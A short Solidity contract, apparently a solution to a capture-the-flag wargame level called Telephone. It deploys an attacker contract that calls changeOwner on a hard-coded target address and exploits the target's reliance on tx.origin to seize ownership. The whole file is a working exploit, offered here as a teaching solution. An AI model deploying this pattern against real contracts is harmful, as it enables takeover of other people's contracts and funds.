// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./Telephone.sol";

contract TelephoneAttacker is Ownable {
    address constant telephoneToAttack =
        0x925119A90D9Dc3e7D06A6C4578347D986cAe8E56;

    Telephone telephone = Telephone(telephoneToAttack);

    constructor() {}

    function attackTelephone() public onlyOwner {
        telephone.changeOwner(msg.sender);
    }
}
